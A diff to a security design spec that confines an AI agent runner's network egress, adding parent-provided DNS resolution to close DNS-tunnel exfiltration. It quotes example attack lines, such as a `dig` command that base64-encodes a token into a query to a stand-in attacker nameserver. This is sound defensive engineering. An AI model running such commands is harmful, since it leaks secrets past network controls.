@@ -29,7 +29,7 @@
 > - **Launch Slice (ship now — this PR):** §1 own-netns (drop `--share-net`) + §2 in-netns **nftables IP-allowlist** (default-deny; allow only the resolved IPs of the inference endpoint + the 8 `REGISTRY_ALLOWLIST` hosts) + §3 parent-owned `allow_hosts`. Closes **arbitrary-host** exfil — the wide-open `curl $secret → anywhere` case, ~the entire practical attack surface. Rides M84_003's bwrap/lane work.
 > - **Deferred to untrusted-runner GA (§5 — do NOT build for launch):** the L7 DNS-pinning forward proxy (name-based Server-Name-Indication (SNI) / `CONNECT` allowlisting for rotating Content Delivery Networks (CDNs), DNS-rebinding pin, encrypted-SNI / DNS-over-HTTPS default-deny). It is the refinement the *untrusted* tier needs when the operator's host list cannot be trusted and CDN IP sets churn; the trusted launch allowlist (inference + 8 registries) is small and stable, so resolve-to-IP-at-setup suffices.
 >
-> **Honest residual (does NOT close at launch — say so out loud):** an allow-listed write-capable host (github.com, which the agent legitimately needs) remains an exfil channel by design. Only short-lived / scoped tokens — a credential-model change, **NOT** this spec — close that last sliver. This slice shrinks the blast radius from **"the entire internet"** to **"a handful of known hosts."**
+> **Honest residual (does NOT close at launch — say so out loud):** an allow-listed write-capable host (github.com, which the agent legitimately needs) remains an exfil channel by design. Only short-lived / scoped tokens — a credential-model change, **NOT** this spec — close that last sliver. (A second classic channel — **DNS tunnelling** through a forwarding resolver — is *closed* by this slice via parent-only resolution, §3.3, not left as a residual.) This slice shrinks the blast radius from **"the entire internet"** to **"a handful of known hosts."**
 
 ## Implementing agent — read these first
 
@@ -141,12 +141,14 @@ The allowlist the operator declares (install config / `RUNNER_NETWORK_POLICY` + 
 
 - **Dimension 3.1** — the resolved IP set always contains the configured inference endpoint/gateway; a lease whose inference host is unresolvable fails closed at setup, not mid-run → Test `test_inference_host_always_allowed`
 - **Dimension 3.2** — `allow_hosts` is a parent-only read; nothing in the child's environment or lease can extend the nft set → Test `test_allowlist_not_child_extendable`
+- **Dimension 3.3 (DNS-tunnel closure)** — the child cannot reach a **forwarding** DNS resolver: name→IP resolution is parent-provided (static name→IP mappings injected into the netns, or a non-forwarding stub that answers ONLY allowlisted names and forwards nothing upstream); nftables drops port 53 except to that stub. This **closes the DNS-tunnel exfil channel** — `dig $(echo $TOKEN | base64).attacker-ns.com @<resolver>` encodes the secret in the query name and reaches an attacker's authoritative nameserver *through* a forwarding resolver, which the IP-allowlist alone cannot see (the connect target is the *allowed* resolver IP). → Tests `test_no_forwarding_resolver_reachable` + `test_dns_tunnel_query_dropped`
 
 ### §4 — Honest residual channels (no code; documented)
 
 The allowlist caps the *blast radius*; it is not a complete exfil seal, and the spec says so out loud so operators do not over-trust it.
 
 - **Dimension 4.1** — an allowed host that itself accepts attacker-readable writes (e.g. github.com for a platform-ops agent) is still an exfil channel **by design** — documented, with the real mitigation being short-lived / least-privilege tenant secrets (a separate credential-model change), not the network layer → recorded in Discovery + an operator note (no code).
+- **DNS tunnelling — CLOSED by design (§3.3), not an accepted residual.** A forwarding resolver reachable from the child would let an agent smuggle secrets in DNS query names regardless of the IP-allowlist; §3.3 closes it (parent-provided resolution / non-forwarding stub). Called out here so a future maintainer does not silently re-open it by "just allowing port 53 to the resolver." The only standing residual is §4.1 (a write-capable allowed host).
 
 ### §5 — DEFERRED to untrusted-runner GA: L7 DNS-pinning forward proxy
 
@@ -165,8 +167,10 @@ The allowlist caps the *blast radius*; it is not a complete exfil seal, and the 
 #   - resolved at LEASE SETUP (parent) to an IP set; the child never resolves or widens it.
 # Child network namespace (own, not shared):
 #   veth pair -> host; in-netns nftables: default DROP egress, ACCEPT only resolved allowlist IPs.
+#   name resolution is PARENT-PROVIDED: static name->IP mappings injected into the netns, OR a
+#   non-forwarding stub that answers ONLY allowlisted names. NO forwarding resolver is reachable (§3.3).
 # Enforcement contract:
-#   child connect(ip) succeeds  IFF  ip ∈ resolved-allowlist-IPs (∪ DNS resolver, if in-child resolution)
+#   child connect(ip) succeeds  IFF  ip ∈ resolved-allowlist-IPs   (no port-53 path to a forwarding resolver)
 #   else  -> dropped by nftables (logged: host/IP only, never secret/full-URL)
 #   no rules installed (setup failure) -> child has NO egress (fail-closed)
 ```
@@ -183,6 +187,7 @@ Contract: the legitimate path (inference endpoint + declared `allow_hosts`, rule
 | Allowlist too loose | an exfil-capable host added | by design the operator's call; §4.1 documents that write-capable allowed hosts remain channels — mitigate via least-privilege secrets, not nftables. |
 | **Rotating CDN IPs mid-lease** | a provider (github.com, api.anthropic.com) rotates to an IP not in the resolved set during a long lease | the connect to the new IP drops. **Launch mitigation:** the launch set (inference + 8 registries) is small/stable, resolved at setup; for long leases, PLAN decides periodic re-resolve OR a provider CIDR allowance. The complete fix (name-layer) is the deferred §5 proxy. Document the limitation; don't silently widen to a CIDR that re-opens exfil. |
 | nft/netns setup fails | kernel/permission error installing rules | child has **no** egress (fail-closed); lease classified a sandbox/egress failure, never falls back to open net. `test_egress_fails_closed_without_rules`. |
+| In-child forwarding resolver | an implementer "just allows port 53" to a real/recursive resolver | **reopens DNS-tunnel exfil** (`dig data.attacker-ns.com @resolver` smuggles secrets in query names past the IP-allowlist). Forbidden by §3.3: child resolution is parent-provided / non-forwarding-stub only. Caught by `test_dns_tunnel_query_dropped`. |
 | Operator runs `deny_all` | no network configured | unchanged — empty netns, no veth; the agent has no egress (correct for non-network agents). |
 
 ---
@@ -190,7 +195,7 @@ Contract: the legitimate path (inference endpoint + declared `allow_hosts`, rule
 ## Invariants
 
 1. **No host-netns sharing** — no sandboxed tier emits `--share-net`; the child's net namespace is always unshared. Enforced by `test_no_share_net_on_any_sandboxed_tier`.
-2. **Default-deny egress (nftables)** — a destination IP not in the resolved allowlist is dropped in the child's netns; the child's only route is the veth gated by nft. Enforced by `test_denied_ip_dropped` + `test_egress_fails_closed_without_rules`.
+2. **Default-deny egress (nftables)** — a destination IP not in the resolved allowlist is dropped in the child's netns; the child's only route is the veth gated by nft, and **no forwarding DNS resolver is reachable** (§3.3) so secrets cannot tunnel in DNS query names. Enforced by `test_denied_ip_dropped` + `test_egress_fails_closed_without_rules` + `test_dns_tunnel_query_dropped`.
 3. **No datastore credential in the child** — the runner is built `base,sqlite` (`build_runner.zig`); the child holds no database connection string and opens no datastore socket; durable memory is the control plane's HTTPS responsibility. **Never build the runner with `-Dengines=postgres`.** Enforced by a build-config assertion + the absence of a DB host in the resolved allowlist.
 4. **Allowlist is parent-owned** — nothing in the child's environment or lease can widen the resolved nft set. Enforced by `test_allowlist_not_child_extendable`.
 5. **Legitimate path unchanged** — inference endpoint + declared `allow_hosts` (rules installed) produce an identical observable outcome; a golden-arg/integration test pins it.
@@ -210,6 +215,7 @@ Contract: the legitimate path (inference endpoint + declared `allow_hosts`, rule
 | 2.3 | integration-runner | `test_link_local_and_private_denied` | child connect to 127.0.0.1 (host) / 169.254.x / RFC1918 (outside veth subnet) → dropped |
 | 3.1 | unit + integration-runner | `test_inference_host_always_allowed` | configured inference endpoint resolved + present in the nft set; unresolvable → fail-closed at setup |
 | 3.2 | unit | `test_allowlist_not_child_extendable` | an `allow_hosts`-like value in child env/lease does NOT widen the nft set |
+| 3.3 | integration-runner | `test_no_forwarding_resolver_reachable` + `test_dns_tunnel_query_dropped` | child has no port-53 path to a forwarding resolver; a `dig data.x.com @resolver` tunnel attempt is dropped; allowlisted-name resolution still succeeds via the parent-provided path |
 
 - **Regression:** existing runner suite (`make test-unit-zigrunner`) + a legitimate end-to-end lease (inference + an allowed tool host) still pass — the network-enabled agent still works.
 - **Idempotency/replay:** N/A.
@@ -224,6 +230,7 @@ Contract: the legitimate path (inference endpoint + declared `allow_hosts`, rule
 - [ ] Link-local / loopback-to-host / private-range dropped — verify: `test_link_local_and_private_denied`
 - [ ] nft/netns setup failure fails closed (no open-net fallback) — verify: `test_egress_fails_closed_without_rules`
 - [ ] Inference endpoint always resolved into the nft set; allowlist not child-extendable — verify: `test_inference_host_always_allowed` + `test_allowlist_not_child_extendable`
+- [ ] No forwarding DNS resolver reachable from the child; DNS-tunnel attempt dropped (parent-provided resolution) — verify: `test_no_forwarding_resolver_reachable` + `test_dns_tunnel_query_dropped`
 - [ ] Child holds no datastore credential; runner not built with postgres engine — verify: `grep -n 'engines' build_runner.zig` shows `base,sqlite`; no DB host in the resolved allowlist
 - [ ] `make lint` clean · `make test-unit-zigrunner` + `make test-integration-runner` pass · cross-compile both linux targets
 - [ ] `gitleaks detect` clean · no file over 350 lines added
@@ -274,6 +281,7 @@ gitleaks detect 2>&1 | tail -3
   - the lease carries the raw secret inline (`protocol_test.zig:239`); `secrets_resolve.zig:48` reads vault creds verbatim; `docs/AUTH.md:204` "static, long-lived, never expires" → the "short-lived/least-privilege tool secrets" compensating control is **unbuilt**.
   - **Verdict:** PULL-SLICE — ship the kernel default-deny half (own-netns + nftables IP-allowlist) for launch; defer the L7 proxy (§5) to untrusted-GA. Honest caveat: github.com-via-github exfil stays open until scoped tokens land (§4.1).
   - **Indy decision (verbatim, Jun 10, 2026):** _"I want to go with 1"_ — option 1 (nftables egress slice). Context: chosen over (2) build short-lived tokens, (3) interim deny_all for token-bearing leases, (4) accept+document.
+- **Greptile review (PR #384, Jun 10, 2026):** flagged a **DNS-tunnel exfil residual** — the draft Interfaces contract left `(∪ DNS resolver, if in-child resolution)` open, which a forwarding resolver turns into a `dig data.attacker.com @resolver` channel the IP-allowlist cannot see (connect target is the *allowed* resolver IP). **Resolved by closing it, not accepting it:** §3.3 mandates parent-provided resolution / a non-forwarding stub; Interfaces, Failure Modes, Invariant 2, §4, Test Spec + Acceptance updated. Verdict: P2, VALID & ACTIONABLE.
 - **Deferrals** — the L7 DNS-pinning proxy (§5) is deferred to untrusted-runner GA per the Jun 10 decision above (Indy-acked option 1, which is "pull the nft slice, defer the proxy"). Any *further* deferral needs a fresh Indy-acked quote here.
 - **Skill chain outcomes** — {`/write-unit-test`, `/review`, `/review-pr` results.}
 
